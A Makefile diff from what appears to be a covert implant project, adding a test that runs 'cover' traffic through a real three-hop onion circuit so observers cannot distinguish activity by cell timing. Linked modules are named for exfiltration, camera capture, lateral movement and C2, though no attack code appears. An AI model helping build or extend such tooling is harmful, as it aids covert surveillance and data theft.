@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -157,7 +157,18 @@ $(BUILD)/test_cover_loop: tests/test_cover_loop.c $(BUILD)/cover_loop.o \
 	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
 	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop
+# 覆盖循环接进**真实洋葱电路**的长跑：3 跳真进程 + tee 旁路抓包。
+# 验证恒定形态在真实转发路径上仍成立，且做 budget=0 静默对照——
+# 观察者只看信元数与间隔就能区分"有覆盖"和"无覆盖"，差异方向必须正确。
+$(BUILD)/test_cover_circuit: tests/test_cover_circuit.c $(BUILD)/cover_loop.o \
+    $(BUILD)/task_cover.o $(BUILD)/task.o $(BUILD)/task_link.o \
+    $(BUILD)/exfil_link.o $(BUILD)/exfil.o $(BUILD)/sched.o \
+    $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/cover_loop.o $(BUILD)/task_cover.o \
+	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
+	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
